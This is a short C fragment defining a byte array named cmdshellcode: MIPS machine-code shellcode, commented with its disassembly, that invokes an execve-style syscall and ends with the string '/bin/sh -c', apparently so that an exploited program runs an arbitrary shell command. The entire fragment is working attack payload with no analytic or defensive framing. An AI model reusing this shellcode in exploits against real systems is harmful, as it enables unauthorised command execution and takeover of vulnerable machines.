char cmdshellcode[]=
                      "\x04\x10\xff\xff"       /* bltzal  $zero,<_cmdshellcode> */
                      "\x24\x02\x03\xf3"       /* li      $v0,1011              */
                      "\x23\xff\x08\xf4"       /* addi    $ra,$ra,2292          */
                      "\x23\xe4\xf7\x40"       /* addi    $a0,$ra,-2240         */
                      "\x23\xe5\xfb\x24"       /* addi    $a1,$ra,-1244         */
                      "\xaf\xe4\xfb\x24"       /* sw      $a0,-1244($ra)        */
                      "\x23\xe6\xf7\x48"       /* addi    $a2,$ra,-2232         */
                      "\xaf\xe6\xfb\x28"       /* sw      $a2,-1240($ra)        */
                      "\x23\xe6\xf7\x4c"       /* addi    $a2,$ra,-2228         */
                      "\xaf\xe6\xfb\x2c"       /* sw      $a2,-1236($ra)        */
                      "\xaf\xe0\xfb\x30"       /* sw      $zero,-1232($ra)      */
                      "\xa3\xe0\xf7\x47"       /* sb      $zero,-2233($ra)      */
                      "\xa3\xe0\xf7\x4a"       /* sb      $zero,-2230($ra)      */
                      "\x02\x04\x8d\x0c"       /* syscall                       */
                      "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0           */
                      "/bin/sh -c  "
                  ;